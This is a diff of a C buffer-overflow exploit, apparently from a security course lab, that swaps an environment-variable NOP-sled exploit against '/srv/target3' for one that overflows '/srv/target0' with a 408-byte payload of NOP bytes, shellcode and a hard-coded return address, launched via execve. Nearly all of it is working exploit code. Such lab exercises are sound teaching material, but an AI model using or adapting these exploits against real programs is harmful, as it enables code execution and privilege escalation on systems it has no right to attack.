@@ -5,34 +5,34 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target3"
-#define ENV_SIZE 400
-#define BASE_ADDRESS 0xffffdec0
-#define NOP_SLED_SIZE 201
-#define NOP 0x90
-#define RET_ADDR_OFFSET 4
+const char* TARGET = "/srv/target0";
 
-const uint32_t StartAddress = BASE_ADDRESS + RET_ADDR_OFFSET;
-const uint32_t SecondAddress = BASE_ADDRESS + 2 * RET_ADDR_OFFSET;
-const char Padding[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
+const int PAYLOADSIZE = 408;
+const int SHELLCODESIZE = sizeof(shellcode) - 1;
+const uint32_t RETADDR = 0xffffdb2c;
 
-void prepareEnvironment(char *environment) {
-    memset(environment, NOP, ENV_SIZE - 1);
-    *((uint32_t *)(environment)) = StartAddress;
-    *((uint32_t *)(environment + RET_ADDR_OFFSET)) = SecondAddress;
-    memcpy(environment + NOP_SLED_SIZE, shellcode, sizeof(shellcode));
-    environment[ENV_SIZE - 1] = '\0';
+void prepPayload(char *payload) {
+    memset(payload, 0x90, PAYLOADSIZE);
+    payload[PAYLOADSIZE] = '\0';
+    memcpy(payload, shellcode, SHELLCODESIZE);
+    *(uint32_t*)(payload + PAYLOADSIZE - 4) = RETADDR;
 }
 
-int main(void) {
-    char *arguments[] = {TARGET, Padding, NULL};
-    static char environment[ENV_SIZE];
+int main(void)
+{
+    char *args[3];
+    char *env[1];
+    char payload[PAYLOADSIZE + 1];
 
-    prepareEnvironment(environment);
+    prepPayload(payload);
 
-    char *env[] = {environment};
+    args[0] = TARGET;
+    args[1] = payload;
+    args[2] = NULL;
 
-    execve(TARGET, arguments, env);
+    env[0] = NULL;
+
+    execve(TARGET, args, env);
     fprintf(stderr, "execve failed.\n");
 
     return 0;
